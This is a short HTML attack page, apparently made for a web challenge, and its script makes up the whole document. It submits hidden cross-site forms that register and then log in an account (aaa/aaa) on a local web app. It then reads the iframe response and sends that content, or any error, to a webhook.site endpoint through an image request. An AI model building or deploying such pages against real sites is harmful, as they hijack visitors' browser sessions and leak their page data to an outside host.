<!DOCTYPE html>
<html>
<body>
<script>
var iframe = document.createElement('iframe');
iframe.name = 'f1';
iframe.id = 'f1';
document.body.appendChild(iframe);

// Register + Login 한번에
var regForm = document.createElement('form');
regForm.method = 'POST';
regForm.action = 'http://0.0.0.0:3000/register';
regForm.target = 'f1';
var u1 = document.createElement('input');
u1.name = 'username';
u1.value = 'aaa';
regForm.appendChild(u1);
var p1 = document.createElement('input');
p1.name = 'password';
p1.value = 'aaa';
regForm.appendChild(p1);
document.body.appendChild(regForm);
regForm.submit();

setTimeout(function(){
  var loginForm = document.createElement('form');
  loginForm.method = 'POST';
  loginForm.action = 'http://0.0.0.0:3000/login';
  loginForm.target = 'f1';
  var u2 = document.createElement('input');
  u2.name = 'username';
  u2.value = 'aaa';
  loginForm.appendChild(u2);
  var p2 = document.createElement('input');
  p2.name = 'password';
  p2.value = 'aaa';
  loginForm.appendChild(p2);
  document.body.appendChild(loginForm);
  loginForm.submit();
}, 150);

setTimeout(function(){
  try {
    var c = document.getElementById('f1').contentDocument.body.innerHTML;
    new Image().src = 'https://webhook.site/showontest?main=' + encodeURIComponent(c);
  } catch(e) {
    new Image().src = 'https://webhook.site/showontest?err=' + encodeURIComponent(e.message);
  }
}, 400);
</script>
</body>
</html>